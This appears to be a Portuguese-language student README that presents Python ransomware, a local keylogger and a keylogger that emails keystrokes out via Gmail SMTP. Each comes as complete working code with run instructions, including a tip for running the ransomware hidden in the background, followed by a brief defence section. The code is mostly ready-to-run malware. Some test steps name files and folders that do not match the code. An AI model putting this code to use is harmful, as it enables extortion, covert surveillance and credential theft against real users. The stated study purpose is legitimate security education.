# Projeto Prático: Simulação de Malware e Estratégias de Defesa 🛡️

Este projeto consiste na implementação documentada de malwares simulados (Ransomware e Keylogger) desenvolvidos em Python. O objetivo é demonstrar o funcionamento técnico dessas ameaças em um ambiente seguro e controlado, permitindo o estudo de medidas defensivas e prevenção de incidentes.

---

## 1. Ransomware Simulado 🔒

O script de Ransomware demonstra a fase de impacto, onde arquivos da vítima são tornados inacessíveis através de criptografia de nível militar.

### 📝 Explicação Técnica
O código utiliza a biblioteca `cryptography` (Fernet) para realizar criptografia simétrica. Ele gera uma chave aleatória que é salva localmente (simulando a chave que ficaria com o atacante) e sobrescreve o conteúdo original dos arquivos `.txt` por uma versão cifrada.

### 💻 Código do Ransomware (`ransomware.py`)
```python
from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
            chave_file.write(chave)

#2. Carregar a chave de criptografia
def carregar_chave():
    return open("chave.key", "rb").read()


#3. Criptografar os arquivos
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar e criptografar arquivos em um diretório
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):  # Evitar criptografar a chave
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! Para recuperá-los, envie um bitcoin para o endereço XYZ e entre em contato conosco. Depois disso enviamos a chave de descriptografia.")

#6. Execução principal do programa
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado com sucesso! Seus arquivos foram criptografados.")

if __name__ == "__main__":
    main()
```

### 🧪 Como realizar o teste:
1. **Instale a biblioteca necessária:** `pip install cryptography`.
2. **Execute o script:** `python ransomware.py`.
3. **Para executar em segundo plano renomeie o arquivo ransoware.py para ransoware.pyw.**
4. **Observe os resultados:** A pasta `arquivos_vulneraveis` será criada e os arquivos dentro dela estarão ilegíveis.
5. **Verifique a nota de resgate:** O arquivo `AVISO_RESGATE.txt` aparecerá na raiz do diretório.

---

## 2. Keylogger
## 2.1. Keylogger Simulado sem Exfiltração ⌨️

O Keylogger simula a fase de espionagem e roubo de dados, capturando tudo o que é digitado no teclado.

### 📝 Explicação Técnica: Keylogger Local (pynput)

Este script tem como objetivo a captura de eventos de teclado e o armazenamento persistente em um arquivo de texto local (`log.txt`). Diferente de versões anteriores, este módulo foca na **filtragem de ruído** e na **organização de caracteres especiais** para manter o log legível.

#### Componentes Principais:

1. **Intercepção de Eventos (Hooks):**
   O script utiliza a classe `keyboard.Listener` da biblioteca `pynput`. Ela cria um "gancho" (*hook*) no sistema operacional que monitora o fluxo de entrada de hardware. Sempre que uma tecla é pressionada, o sistema gera um evento que é enviado para a nossa função `on_press`.

2. **Filtragem de Teclas (Set de Ignorados):**
   Foi implementado um conjunto (`set`) chamado `IGNORAR`. Ele contém teclas modificadoras como `Shift`, `Ctrl`, `Alt` e `Cmd`. 
   * **Objetivo:** Evitar que o log fique poluído com comandos de sistema, focando apenas no texto digitado pelo usuário.

3. **Tratamento de Exceções (`AttributeError`):**
   O código separa as teclas em duas categorias técnicas:
   * **Teclas Alfanuméricas:** Capturadas via `key.char` (letras, números e símbolos).
   * **Teclas Especiais:** Quando `key.char` não existe, o erro é tratado no bloco `except`. Aqui, teclas como `Espaço`, `Enter` e `Tab` são traduzidas manualmente para seus equivalentes em texto (ex: `\n` ou `\t`) para manter a estrutura original do que foi digitado.

4. **Persistência em Disco:**
   O arquivo é aberto no modo `"a"` (*append*), o que significa que novos dados são adicionados ao final do arquivo sem apagar o conteúdo anterior. O uso de `encoding="utf-8"` garante que caracteres especiais do teclado brasileiro não sejam corrompidos.

---

### 💻 Código do Keylogger (`keylogger.py`)
```python
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift_l,
    keyboard.Key.shift_r, 
    keyboard.Key.ctrl_l, 
    keyboard.Key.ctrl_r, 
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key):
    try:
        #se for uma tecla "normal" (letra, número, etc), escreva o caractere correspondente
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        #se for uma tecla especial (shift, ctrl, etc), escreva o nome da tecla
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

```

### 🧪 Como realizar o teste:

1. **Instale a biblioteca:** `pip install pynput`.
2. **Execute o script:** `python nome_do_arquivo.py`.
3. **Interação:** Digite algo em qualquer editor de texto.
4. **Validação:** Abra o arquivo `log.txt` que será gerado na mesma pasta do script para visualizar as teclas capturadas.

---
**Nota:** Este módulo opera apenas localmente, sem comunicação externa, sendo ideal para estudos de monitoramento de processos de entrada.


## 2.2. Keylogger Simulado com Exfiltração ⌨️
### 📝 Explicação Técnica: Keylogger com Exfiltração (pynput + SMTP)

Este módulo simula um estágio avançado de um ataque cibernético: a **exfiltração de dados**. Além de capturar as teclas, o script utiliza protocolos de rede para enviar as informações coletadas para um servidor remoto de forma automatizada e periódica.

#### Componentes Principais:

1. **Captura em Tempo Real (Hooking):**
   Utiliza a biblioteca `pynput.keyboard` para monitorar o hardware. A função `on_press` atua como um acumulador, tratando teclas alfanuméricas e traduzindo teclas de controle (como `Espaço` e `Enter`) para manter a legibilidade do texto capturado no buffer global `log`.

2. **Gerenciamento de Threads (Threading Timer):**
   Para não travar a captura das teclas enquanto o e-mail é enviado, o script utiliza a classe `Timer`. 
   * **Recursividade Assistida:** A função `enviar_email` agenda a si mesma para rodar a cada 60 segundos.
   * **Daemon Thread:** O timer é configurado como `daemon = True`, garantindo que o processo de envio seja encerrado instantaneamente caso o script principal seja interrompido.

3. **Protocolo de Comunicação (SMTP + TLS):**
   A exfiltração ocorre através do protocolo **SMTP** (*Simple Mail Transfer Protocol*):
   * **Porta 587:** Utilizada para comunicações seguras.
   * **STARTTLS:** Comando que eleva uma conexão de texto simples para uma conexão criptografada (SSL/TLS), protegendo os dados capturados durante o trajeto até o servidor do Gmail.
   * **Autenticação:** Exige o uso de uma "Senha de App", contornando bloqueios de segurança padrão de contas de e-mail.

4. **Tratamento de Falhas e Integridade:**
   O buffer `log` só é limpo (`log = ""`) após a confirmação de que o servidor SMTP aceitou a mensagem. Caso ocorra uma falha de conexão (ex: falta de internet), os dados permanecem acumulados para serem enviados na próxima tentativa bem-sucedida.

5. **Criar e-mail do GMAIL e gerar senha no https://myaccount.google.com/apppasswords para o e-mail criado

---

### 💻 Código do Keylogger (`keylogger.py`)
```python
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configurações de Email
EMAIL_ORIGEM = "seuemail@gmail.com"
EMAIL_DESTINO = "seuemail@gmail.com"
SENHA_EMAIL = "senha criada no https://myaccount.google.com/apppasswords" # Certifique-se que esta é uma "Senha de App"

def enviar_email():
    global log
    
    # Primeiro agendamos o próximo envio para garantir que o loop nunca pare
    timer = Timer(60, enviar_email)
    timer.daemon = True # Faz o timer encerrar se o programa principal fechar
    timer.start()

    if log: # Só tenta enviar se houver algo digitado
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo Keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            # Uso de 'with' garante que o servidor feche corretamente mesmo com erro
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(EMAIL_ORIGEM, SENHA_EMAIL)
                server.send_message(msg)
                print("Email enviado com sucesso!")
            log = "" # Limpa o log APENAS se o envio funcionar
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        elif key == keyboard.Key.backspace:
            # Corrigi aqui: era log = "[<]", o que apagava todo o log anterior
            log += "[<]" 
        else:
            pass

# Iniciar o envio automático ANTES do listener
enviar_email()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

### 🧪 Como realizar o teste:

1. **Dependências:** `pip install pynput`.
2. **Configuração:** Insira um e-mail válido e uma senha de aplicativo gerada nas configurações de segurança do Google.
3. **Execução:** `python nome_do_arquivo.py`.
4. **Validação:** Digite um texto curto, aguarde 60 segundos e verifique a caixa de entrada (ou spam) do e-mail de destino.

---
**Nota:** Este script demonstra o risco de exfiltração de dados sensíveis e a importância de monitorar tráfego de rede suspeito em portas de e-mail.


## 3. Reflexão sobre Defesa e Prevenção 🛡️
A análise destes malwares permite o desenvolvimento de uma mentalidade defensiva baseada em camadas.

### 🛠️ Medidas de Defesa Técnica
* **Antivírus/EDR:** Implementação de soluções que monitoram comportamentos suspeitos, como a criptografia rápida de múltiplos arquivos ou o registro de hooks de teclado.
* **Firewall de Host:** Configuração de regras de saída para bloquear conexões SMTP (porta 587) originadas por scripts não autorizados.
* **MFA (Autenticação de Múltiplos Fatores):** A defesa mais eficaz contra keyloggers. Mesmo que a senha seja capturada, o atacante não terá acesso ao código dinâmico do MFA.

### 👥 Medidas Administrativas e Educacionais
* **Backups Offline (Air-gapped):** A única proteção 100% garantida contra o impacto do ransomware é possuir cópias de dados desconectadas da rede.
* **Princípio do Privilégio Mínimo:** Garantir que usuários comuns não possuam permissões administrativas, o que impediria a execução de hooks de teclado globais.
* **Conscientização:** Treinamentos periódicos para identificar vetores de infecção (Phishing), que é a principal forma de entrada dessas ameaças.

---
**Documentação produzida para fins de estudo em Segurança da Informação.**


